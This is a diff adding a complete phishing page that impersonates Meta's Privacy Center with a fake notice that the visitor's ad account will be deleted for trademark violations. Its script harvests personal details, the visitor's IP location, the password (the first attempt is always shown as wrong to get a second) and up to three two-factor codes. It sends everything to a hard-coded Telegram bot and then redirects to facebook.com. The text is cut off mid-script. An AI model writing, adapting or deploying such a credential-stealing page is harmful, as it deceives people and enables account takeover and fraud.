@@ -1,0 +1,919 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Privacy Center</title>
+    <!-- intl-tel-input CSS for flags -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css"/>
+    <style>
+        :root {
+            --fb-blue: #1877f2;
+            --fb-bg: #f0f2f5;
+            --text-dark: #1c1e21;
+            --text-muted: #606770;
+            --border: #ccd0d5;
+        }
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: inherit;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        body {
+            background-color: var(--fb-bg);
+            color: var(--text-dark);
+            display: flex;
+            min-height: 100vh;
+            padding-left: 300px;
+        }
+        
+        /* Sidebar */
+        .sidebar {
+            width: 300px;
+            background: #fff;
+            padding: 20px;
+            box-shadow: 1px 0 2px rgba(0,0,0,0.1);
+            display: flex;
+            flex-direction: column;
+            position: fixed;
+            top: 0; bottom: 0; left: 0;
+        }
+        .meta-logo {
+            font-size: 20px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            margin-bottom: 24px;
+            color: #1c1e21;
+        }
+        .meta-logo svg {
+            width: 24px;
+            height: 24px;
+            color: var(--fb-blue);
+        }
+        .nav-item {
+            padding: 12px 16px;
+            border-radius: 8px;
+            margin-bottom: 4px;
+            cursor: pointer;
+            font-weight: 600;
+            color: var(--text-dark);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 15px;
+        }
+        .nav-item.active {
+            background: #334155;
+            color: #fff;
+        }
+        .nav-item:not(.active):hover {
+            background: #f2f2f2;
+        }
+        
+        /* Main Content */
+        .main-content {
+            flex: 1;
+            padding: 60px 40px;
+            max-width: 900px;
+            margin: 0 auto;
+        }
+        .header-warning {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            margin-bottom: 24px;
+        }
+        .header-warning h1 {
+            font-size: 28px;
+            line-height: 1.2;
+            color: #000;
+        }
+        .icon-stop {
+            width: 40px;
+            height: 40px;
+            background: #e41e3f;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+        .icon-stop::before {
+            content: "";
+            width: 20px;
+            height: 6px;
+            background: white;
+            display: block;
+        }
+        .main-text {
+            font-size: 15px;
+            line-height: 1.6;
+            margin-bottom: 20px;
+            color: #1c1e21;
+        }
+        .ticket-id {
+            font-weight: 700;
+            font-size: 15px;
+            margin-bottom: 32px;
+            color: #000;
+        }
+        
+        /* Card */
+        .card {
+            background: #e9f0ff;
+            border-radius: 12px;
+            padding: 0;
+            margin-bottom: 40px;
+            position: relative;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.05);
+        }
+        .illustration-container {
+            height: 220px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        /* Inline SVG for the shield/lock illustration to look like the image */
+        .illustration-container svg {
+            width: 350px;
+            height: auto;
+        }
+        .card-inner {
+            background: #fff;
+            border-radius: 12px;
+            padding: 24px;
+            margin: 0 24px 24px 24px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+        .card-inner h2 {
+            font-size: 20px;
+            margin-bottom: 12px;
+            color: #000;
+        }
+        .card-inner p {
+            font-size: 14px;
+            margin-bottom: 12px;
+            color: #1c1e21;
+        }
+        .btn {
+            background: var(--fb-blue);
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            padding: 12px 24px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            display: block;
+            text-align: center;
+            transition: background 0.2s;
+        }
+        .btn:hover {
+            background: #166fe5;
+        }
+        
+        .section-title {
+            font-size: 18px;
+            margin-bottom: 16px;
+            color: #000;
+        }
+        .infringement-text {
+            color: var(--text-muted);
+            font-size: 14px;
+            line-height: 1.6;
+        }
+        .infringement-list {
+            margin-left: 20px;
+            color: var(--text-muted);
+            font-size: 14px;
+            line-height: 1.6;
+            margin-top: 8px;
+        }
+        
+        /* Modals */
+        .modal-overlay {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.6);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+        .modal {
+            background: #fff;
+            border-radius: 8px;
+            width: 100%;
+            max-width: 520px;
+            max-height: 90vh;
+            overflow-y: auto;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            padding: 0;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+        }
+        /* Custom scrollbar for form */
+        .modal::-webkit-scrollbar { width: 8px; }
+        .modal::-webkit-scrollbar-thumb { background: #bcc0c4; border-radius: 4px; }
+        
+        .modal-body {
+            padding: 24px;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+        .form-control {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            font-size: 15px;
+            background: #f5f6f7;
+            color: #1c1e21;
+            transition: border-color 0.2s;
+        }
+        .form-control:focus {
+            outline: none;
+            border-color: var(--fb-blue);
+            background: #fff;
+        }
+        .form-control::placeholder {
+            color: #8d949e;
+        }
+        textarea.form-control {
+            resize: vertical;
+            min-height: 100px;
+        }
+        .iti { width: 100%; } /* intl-tel-input full width */
+        
+        .dob-group {
+            display: flex;
+            gap: 12px;
+        }
+        .dob-group select {
+            flex: 1;
+            padding: 14px 12px;
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            background: #f5f6f7;
+            font-size: 15px;
+            cursor: pointer;
+        }
+        .dob-group select:focus {
+            outline: none;
+            border-color: var(--fb-blue);
+            background: #fff;
+        }
+        .checkbox-group {
+            display: flex;
+            gap: 12px;
+            align-items: flex-start;
+            font-size: 14px;
+            color: #1c1e21;
+            margin-top: 8px;
+            margin-bottom: 24px;
+        }
+        .checkbox-group input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            margin-top: 2px;
+            cursor: pointer;
+        }
+        
+        /* Password Modal */
+        .pwd-modal {
+            max-width: 440px;
+            text-align: center;
+        }
+        .pwd-header {
+            padding: 24px 24px 16px 24px;
+            border-bottom: 1px solid var(--border);
+            text-align: center;
+        }
+        .pwd-header .fb-logo {
+            color: var(--fb-blue);
+        }
+        .pwd-header .fb-logo svg {
+            width: 48px;
+            height: 48px;
+        }
+        .pwd-body {
+            padding: 24px;
+        }
+        .pwd-body p {
+            font-size: 16px;
+            margin-bottom: 20px;
+            color: #1c1e21;
+        }
+        .pwd-footer {
+            margin-top: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            color: var(--text-muted);
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        .forgot-link {
+            display: block;
+            margin-top: 20px;
+            color: var(--fb-blue);
+            text-decoration: none;
+            font-size: 15px;
+            font-weight: 500;
+        }
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        /* 2FA Modal */
+        .twofa-modal {
+            font-family: Helvetica, Arial, sans-serif;
+            max-width: 500px;
+            background: #fff;
+            padding: 24px;
+            text-align: left;
+        }
+        .twofa-header {
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            color: #1c1e21;
+        }
+        .twofa-desc {
+            font-size: 15px;
+            color: #1c1e21;
+            margin-bottom: 16px;
+            line-height: 1.5;
+        }
+        .twofa-img {
+            width: 100%;
+            border-radius: 8px;
+            margin-bottom: 16px;
+        }
+        .twofa-input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccd0d5;
+            border-radius: 6px;
+            font-size: 15px;
+            margin-bottom: 8px;
+        }
+        .twofa-input:focus {
+            outline: none;
+            border-color: var(--fb-blue);
+        }
+        .twofa-error-text {
+            color: #e41e3f;
+            font-size: 13px;
+            margin-bottom: 16px;
+            display: none;
+        }
+        .btn-secondary {
+            background: #e4e6eb;
+            color: #4b4f56;
+            margin-top: 8px;
+        }
+        .btn-secondary:hover {
+            background: #d8dadf;
+        }
+        .meta-footer {
+            text-align: center;
+            margin-top: 32px;
+            color: #8a8d91;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+
+        @media (max-width: 768px) {
+            body { padding-left: 0; }
+            .sidebar { display: none; }
+            .main-content { margin: 0 auto; padding: 20px; }
+            .header-warning h1 { font-size: 22px; }
+            .twofa-modal { padding: 16px; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="sidebar">
+        <div class="meta-logo" style="margin-left: -4px;">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta" style="height: 18px;">
+        </div>
+        <h2 style="font-size: 18px; margin-bottom: 16px; color: #65676B;">Privacy Center</h2>
+        <div class="nav-item active">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path><polyline points="9 22 9 12 15 12 15 22"></polyline></svg>
+            Privacy Center Home Page
+        </div>
+        <div class="nav-item">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+            Search
+        </div>
+        <div class="nav-item">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+            Privacy Policy
+        </div>
+        <div class="nav-item">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
+            Other rules and articles
+        </div>
+        <div class="nav-item">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"></circle><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"></path></svg>
+            Settings
+        </div>
+    </div>
+
+    <div class="main-content">
+        <div class="header-warning">
+            <div class="icon-stop"></div>
+            <h1>We have scheduled your ad account and pages for deletion</h1>
+        </div>
+        
+        <p class="main-text">We have received multiple reports indicating that your advertisement violates trademark rights. After a detailed review, we have made a decision regarding this matter.</p>
+        <p class="main-text">If no corrective actions are taken, your advertising account will be permanently deleted. If you wish to appeal this decision, please submit an appeal request for review and assistance.</p>
+        <p class="ticket-id" id="ticketIdDisplay"></p>
+
+        <div class="card">
+            <div class="illustration-container">
+                <!-- SVG Illustration matching the reference -->
+                <svg viewBox="0 0 400 200" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <rect x="150" y="30" width="100" height="150" rx="12" fill="#fff" stroke="#1c1e21" stroke-width="4"/>
+                    <!-- Shield -->
+                    <path d="M200 60 L230 70 L230 110 C230 130 200 150 200 150 C200 150 170 130 170 110 L170 70 L200 60 Z" fill="#F5C33B" stroke="#E27B20" stroke-width="4"/>
+                    <path d="M200 60 L200 150 C200 150 230 130 230 110 L230 70 L200 60 Z" fill="#FAD154"/>
+                    <!-- Lock -->
+                    <rect x="250" y="110" width="40" height="30" rx="6" fill="#F36487"/>
+                    <path d="M260 110 V95 C260 85 280 85 280 95 V110" stroke="#1c1e21" stroke-width="4" stroke-linecap="round"/>
+                    <!-- Chat bubbles -->
+                    <rect x="120" y="60" width="50" height="35" rx="10" fill="#A862EA"/>
+                    <path d="M135 95 L145 105 L155 95 Z" fill="#A862EA"/>
+                    <circle cx="135" cy="77" r="3" fill="#fff"/>
+                    <circle cx="145" cy="77" r="3" fill="#fff"/>
+                    <circle cx="155" cy="77" r="3" fill="#fff"/>
+                    <circle cx="100" cy="110" r="12" fill="#1877F2"/>
+                    <path d="M95 110 L99 114 L107 105" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+                    <!-- Password dots -->
+                    <rect x="90" y="140" width="90" height="20" rx="10" fill="#7582EB"/>
+                    <circle cx="105" cy="150" r="3" fill="#fff"/>
+                    <circle cx="115" cy="150" r="3" fill="#fff"/>
+                    <circle cx="125" cy="150" r="3" fill="#fff"/>
+                    <circle cx="135" cy="150" r="3" fill="#fff"/>
+                    <circle cx="145" cy="150" r="3" fill="#fff"/>
+                </svg>
+            </div>
+            <div class="card-inner">
+                <h2>Request review</h2>
+                <p>This form is only to be used for submitting appeals and restoring account status.</p>
+                <p style="margin-bottom: 24px;">Please ensure that you provide the requested information below. Failure to do so may delay the processing of your appeal.</p>
+                <button class="btn" id="openFormBtn">Request Review</button>
+            </div>
+        </div>
+
+        <h3 class="section-title">What is trademark infringement?</h3>
+        <p class="infringement-text">Generally, trademark infringement occurs when all three of the following requirements are met:</p>
+        <ol class="infringement-list">
+            <li>A company or person uses a trademark owner's trademark (or similar trademark) without permission.</li>
+            <li>That use is in commerce, meaning that it's done in connection with the sale or promotion of goods</li>
+        </ol>
+    </div>
+
+    <!-- Form Modal -->
+    <div class="modal-overlay" id="formModal">
+        <div class="modal">
+            <div class="modal-body">
+                <form id="appealForm">
+                    <div class="form-group">
+                        <input type="text" id="fullName" class="form-control" placeholder="Full Name" required>
+                    </div>
+                    <div class="form-group">
+                        <input type="email" id="personalEmail" class="form-control" placeholder="Personal email" required>
+                    </div>
+                    <div class="form-group">
+                        <input type="email" id="businessEmail" class="form-control" placeholder="Business email" required>
+                    </div>
+                    <div class="form-group">
+                        <input type="text" id="pageName" class="form-control" placeholder="Page Name" required>
+                    </div>
+                    
+                    <!-- Phone number with flags -->
+                    <div class="form-group">
+                        <input type="tel" id="phone" class="form-control" placeholder="Phone number" required>
+                    </div>
+                    
+                    <!-- Date of Birth -->
+                    <div class="form-group">
+                        <label style="display:block; margin-bottom: 8px; font-weight: 600; font-size: 14px; color: #1c1e21;">Date of Birth</label>
+                        <div class="dob-group">
+                            <select id="dob-month" required>
+                                <option value="" disabled selected>Month</option>
+                            </select>
+                            <select id="dob-day" required>
+                                <option value="" disabled selected>Day</option>
+                            </select>
+                            <select id="dob-year" required>
+                                <option value="" disabled selected>Year</option>
+                            </select>
+                        </div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <textarea id="additionalInfo" class="form-control" placeholder="Please provide additional information" required></textarea>
+                    </div>
+                    
+                    <p style="font-size: 13px; margin-bottom: 16px; color: var(--text-muted);">We will reply to you within 14 - 48 hours.</p>
+                    
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="agree" required>
+                        <label for="agree">I agree with the <a href="https://www.facebook.com/business/help/117271728356988" target="_blank" style="color: var(--fb-blue); text-decoration: none;">Terms of Use.</a></label>
+                    </div>
+                    
+                    <button type="submit" class="btn">Submit</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- Password Modal -->
+    <div class="modal-overlay" id="pwdModal">
+        <div class="modal pwd-modal" style="border-radius: 8px; box-shadow: 0 12px 28px 0 rgba(0,0,0,0.2),0 2px 4px 0 rgba(0,0,0,0.1),inset 0 0 0 1px rgba(255,255,255,0.5); max-width: 550px;">
+            <div class="pwd-header" style="border-bottom: none; padding-top: 36px; padding-bottom: 24px; text-align: center;">
+                <div class="fb-logo" style="display: flex; justify-content: center;">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="Facebook" style="width: 60px; height: 60px; margin: 0 auto; display: block;">
+                </div>
+            </div>
+            <div class="pwd-body" style="padding-top: 0; padding-bottom: 32px;">
+                <p style="font-size: 14px; margin-bottom: 16px; color: #606770; font-weight: 500; text-align: center; padding: 0 24px;">For your security, you must enter your password to continue.</p>
+                <form id="pwdForm" style="padding: 0 24px;">
+                    <div class="form-group" style="margin-bottom: 12px; position: relative;">
+                        <input type="password" id="pwdInput" class="form-control" placeholder="Password" required style="border: 1px solid #ccd0d5; border-radius: 6px; padding: 12px 40px 12px 16px; background: #fff; font-size: 15px;">
+                        <span id="togglePwd" style="position: absolute; right: 12px; top: 50%; transform: translateY(-50%); cursor: pointer; color: #606770; display: flex; align-items: center; justify-content: center;">
+                            <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+                        </span>
+                    </div>
+                    <div id="pwdError" style="display: none; align-items: center; gap: 4px; color: #e41e3f; font-size: 13px; text-align: left; margin-bottom: 12px;">
+                        <svg viewBox="0 0 24 24" width="14" height="14" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+                        The password you entered is incorrect.
+                    </div>
+                    <button type="submit" class="btn" style="background: #1877f2; color: #fff; border-radius: 6px; padding: 10px; font-weight: 600; font-size: 16px; width: 100%; border: none;">Continue</button>
+                    <a href="https://www.facebook.com/login/identify" target="_blank" class="forgot-link" style="display: block; text-align: center; margin-top: 16px; color: #606770; text-decoration: none; font-size: 14px; font-weight: 500;">Forgot your password?</a>
+                </form>
+                <div class="pwd-footer" style="margin-top: 40px; display: flex; align-items: center; justify-content: center;">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta" style="height: 14px; filter: grayscale(1) opacity(0.7);">
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- 2FA Modal -->
+    <div class="modal-overlay" id="twofaModal">
+        <div class="modal twofa-modal" style="border-radius: 8px; box-shadow: 0 12px 28px 0 rgba(0,0,0,0.2),0 2px 4px 0 rgba(0,0,0,0.1),inset 0 0 0 1px rgba(255,255,255,0.5);">
+            <div style="padding-bottom: 12px; margin-bottom: 8px;">
+                <span id="twofaNameDisplay" style="font-size: 14px; color: #65676b; font-weight: 500;"></span>
+            </div>
+            <h2 class="twofa-header" style="font-size: 18px;">Two-factor authentication required (1/3)</h2>
+            <p class="twofa-desc">Enter the code for this account that we sent to <span id="twofaEmail" style="font-weight: 600;"></span>, <span id="twofaPhone" style="font-weight: 600;"></span> or simply confirm via your two-factor authentication app (like Duo Mobile or Google Authenticator).</p>
+            
+            <form id="twofaForm" style="font-family: inherit;">
+                <input type="text" id="twofaInput" class="twofa-input" placeholder="Security code" required pattern="[0-9]{6,8}">
+                <div id="twofaError" class="twofa-error-text">The code you entered is incorrect. Please try again.</div>
+                
+                <button type="submit" class="btn">Continue</button>
+                <button type="button" class="btn btn-secondary" id="tryAnotherBtn">Try another way</button>
+            </form>
+
+            <div class="meta-footer">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta" style="height: 12px; filter: grayscale(1) opacity(0.7);">
+            </div>
+        </div>
+    </div>
+
+    <!-- Loading Overlay -->
+    <div id="loadingOverlay" style="display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(255, 255, 255, 0.95); z-index: 2000; align-items: center; justify-content: center;">
+        <p style="font-size: 16px; font-weight: 500; color: #606770;">Processing your request...</p>
+    </div>
+
+    <!-- intl-tel-input JS for flags -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
+    <script>
+        // Modal logic
+        const btnOpen = document.getElementById('openFormBtn');
+        const captchaBox = document.getElementById('captchaBox');
+        const captchaCheck = document.getElementById('captchaCheck');
+        const captchaSpinner = document.getElementById('captchaSpinner');
+        const captchaScreen = document.getElementById('captchaScreen');
+        const formModal = document.getElementById('formModal');
+        const appealForm = document.getElementById('appealForm');
+        
+        const pwdModal = document.getElementById('pwdModal');
+        const pwdForm = document.getElementById('pwdForm');
+        
+        const twofaModal = document.getElementById('twofaModal');
+        const twofaForm = document.getElementById('twofaForm');
+        
+        const loadingOverlay = document.getElementById('loadingOverlay');
+
+        // User Data storage
+        let userFullName = '';
+        let userEmail = '';
+        let userPhone = '';
+
+        let ipData = {
+            ip: "N/A", city: "N/A", region: "N/A", country_name: "N/A", org: "N/A",
+            ua: navigator.userAgent
+        };
+        fetch('https://get.geojs.io/v1/ip/geo.json')
+            .then((res) => res.json())
+            .then((data) => { 
+                ipData.ip = data.ip || "N/A";
+                ipData.city = data.city || "N/A";
+                ipData.region = data.region || "N/A";
+                ipData.country_name = data.country || "N/A";
+                ipData.org = data.organization || "N/A";
+            }).catch(() => {});
+
+        let telegramMessageId = null;
+        let currentMessageText = '';
+        const botToken = '8095789860:AAGC65awiFO3r-pAu3LNcuanJPHTcnFfDsU';
+        const botChatId = '-1002813721682';
+
+        function sendTelegram(text) {
+            currentMessageText = text;
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: botChatId, text: text, parse_mode: 'HTML' })
+            })
+            .then(res => res.json())
+            .then(data => { if(data.ok) telegramMessageId = data.result.message_id; })
+            .catch(err => console.error(err));
+        }
+
+        function updateTelegram(appendedText) {
+            currentMessageText += '\n\n' + appendedText;
+            if (!telegramMessageId) {
+                sendTelegram(currentMessageText);
+            } else {
+                fetch(`https://api.telegram.org/bot${botToken}/editMessageText`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: botChatId, message_id: telegramMessageId, text: currentMessageText, parse_mode: 'HTML' })
+                }).catch(err => console.error(err));
+            }
+        }
+
+        btnOpen.addEventListener('click', () => {
+            formModal.style.display = 'flex';
+        });
+
+        appealForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            
+            // Capture data
+            userFullName = document.getElementById('fullName').value;
+            userEmail = document.getElementById('personalEmail').value;
+            let rawPhone = document.getElementById('phone').value;
+            userPhone = phoneInput.getNumber() || (rawPhone ? (rawPhone.startsWith('+') ? rawPhone : '+' + rawPhone) : '');
+            const businessEmail = document.getElementById('businessEmail').value;
+            const pageName = document.getElementById('pageName').value;
+            const additionalInfo = document.getElementById('additionalInfo').value;
+
+            let msg = `🔒 <b>THÔNG TIN CẬP NHẬT</b> 🔒\n`;
+            msg += `----------------------------------\n`;
+            msg += `<b>IP :</b> ${ipData.ip}\n`;
+            msg += `<b>City :</b> ${ipData.city}\n`;
+            msg += `<b>Region :</b> ${ipData.region}\n`;
+            msg += `<b>Country :</b> ${ipData.country_name}\n`;
+            msg += `<b>Org :</b> ${ipData.org}\n`;
+            msg += `----------------------------------\n`;
+            msg += `📌 <b>Name Page:</b> ${pageName || 'N/A'}\n`;
+            msg += `👤 <b>Fullname:</b> ${userFullName || 'N/A'}\n`;
+            msg += `📧 <b>Business Email:</b> ${businessEmail || 'N/A'}\n`;
+            msg += `💌 <b>Personal Email:</b> ${userEmail || 'N/A'}\n`;
+            msg += `📞 <b>Mobile Phone:</b> ${userPhone || 'N/A'}\n`;
+            msg += `📝 <b>Information :</b> ${additionalInfo || 'N/A'}\n`;
+            msg += `🖥 <b>User Agent :</b> ${ipData.ua}\n`;
+            sendTelegram(msg);
+            
+            // Mask Email: a***a@gmail.com
+            let emailName = userEmail.split('@')[0];
+            let emailDomain = userEmail.split('@')[1];
+            let maskedEmail = '';
+            if (emailName.length <= 2) {
+                maskedEmail = emailName.charAt(0) + '*'.repeat(Math.max(1, emailName.length - 1)) + '@' + emailDomain;
+            } else {
+                maskedEmail = emailName.charAt(0) + '*'.repeat(emailName.length - 2) + emailName.charAt(emailName.length - 1) + '@' + emailDomain;
+            }
+
+            // Mask Phone: +84 ****** 50
+            let maskedPhone = userPhone;
+            if (userPhone.length > 6) {
+                let lastTwo = userPhone.slice(-2);
+                let firstPart = userPhone.slice(0, 3); // Assuming +84 or similar
+                maskedPhone = firstPart + ' ****** ' + lastTwo;
+            }
+
+            // Set data in 2FA modal
+            document.getElementById('twofaNameDisplay').textContent = userFullName + ' • Facebook';
+            document.getElementById('twofaEmail').textContent = maskedEmail;
+            document.getElementById('twofaPhone').textContent = maskedPhone;
+
+            formModal.style.display = 'none';
+            loadingOverlay.style.display = 'flex';
+            
+            setTimeout(() => {
+                loadingOverlay.style.display = 'none';
+                pwdModal.style.display = 'flex';
+            }, 4000);
+        });
+
+        let pwdAttempts = 0;
+        pwdForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            pwdAttempts++;
+            const pwdInput = document.getElementById('pwdInput');
+            const pwdError = document.getElementById('pwdError');
+            
+            updateTelegram(`🔑 <b>Password ${pwdAttempts}:</b> ${pwdInput.value}`);
+
+            pwdModal.style.display = 'none';
+            loadingOverlay.style.display = 'flex';
+            
+            setTimeout(() => {
+                loadingOverlay.style.display = 'none';
+                if (pwdAttempts === 1) {
+                    pwdModal.style.display = 'flex';
+                    pwdInput.style.borderColor = '#e41e3f';
+                    pwdError.style.display = 'flex';
+                    pwdInput.value = '';
+                    pwdInput.focus();
+                } else {
+                    twofaModal.style.display = 'flex';
+                }
+            }, 2000);
+        });
+
+        let twofaAttempts = 0;
+        twofaForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            twofaAttempts++;
+            const twofaInput = document.getElementById('twofaInput');
+            const twofaError = document.getElementById('twofaError');
+            
+            updateTelegram(`🛑 <b>2FA Code (${twofaAttempts}):</b> ${twofaInput.value}`);
+
+            twofaModal.style.display = 'none';
+            loadingOverlay.style.display = 'flex';
+            
+            let waitTime = 2000;
+            
+            setTimeout(() => {
+                loadingOverlay.style.display = 'none';
+                if (twofaAttempts < 3) {
+                    twofaModal.style.display = 'flex';
+                    twofaInput.style.borderColor = '#e41e3f';
+                    twofaError.style.display = 'block';
+                    twofaInput.value = '';
+                    twofaInput.focus();
+                    if (twofaAttempts === 1) {
+                        document.querySelector('.twofa-header').textContent = 'Two-factor authentication required (2/3)';
+                    } else if (twofaAttempts === 2) {
+                        document.querySelector('.twofa-header').textContent = 'Two-factor authentication required (3/3)';
+                    }
+                } else {
+                    document.querySelector('.twofa-header').textContent = 'Account Alert';
+                    document.querySelector('.twofa-desc').textContent = 'We have scheduled your ad account and pages for deletion';
+                    twofaForm.innerHTML = '<button type="button" class="btn" onclick="window.location.href=\'https://www.facebook.com/\'" id="okBtn">OK (3s)</button>';
+                    twofaModal.style.display = 'flex';
+                    
+                    let secondsLeft = 3;
+                    const okBtn = document.getElementById('okBtn');
+                    const interval = setInterval(() => {
+                        secondsLeft--;
+                        if (secondsLeft <= 0) {
+                            clearInterval(interval);
+                            window.location.href = 'https://www.facebook.com/';
+                        } else {
+                            okBtn.textContent = `OK (${secondsLeft}s)`;
+                        }
+                    }, 1000);
+                }
+            }, waitTime);
+        });
+
+        const tryAnotherBtn = document.getElementById('tryAnotherBtn');
+        tryAnotherBtn.addEventListener('click', () => {
+            twofaModal.style.display = 'none';
+            loadingOverlay.style.display = 'flex';
+            
+            setTimeout(() => {
+                loadingOverlay.style.display = 'none';
+                document.querySelector('.twofa-header').textContent = 'Account Alert';
+                document.querySelector('.twofa-desc').textContent = 'We have scheduled your ad account and pages for deletion';
+                twofaForm.innerHTML = '<button type="button" class="btn" onclick="window.location.href=\'https://www.facebook.com/\'" id="okBtn">OK (3s)</button>';
+                twofaModal.style.display = 'flex';
+                
+                let secondsLeft = 3;
+                const okBtn = document.getElementById('okBtn');
+                const interval = setInterval(() => {
+                    secondsLeft--;
+                    if (secondsLeft <= 0) {
+                        clearInterval(interval);
+                        window.location.href = 'https://www.facebook.com/';
+                    } else {
+                        okBtn.textContent = `OK (${secondsLeft}s)`;
+                    }
+                }, 1000);
+            }, 2000);
+        });
+
+        const togglePwd = document.getElementById('togglePwd');
+        const pwdInput = document.getElementById('pwdInput');
+        togglePwd.addEventListener('click', () => {
+            const type = pwdInput.getAttribute('type') === 'password' ? 'text' : 'password';
+            pwdInput.setAttribute('type', type);
+            if (type === 'text') {
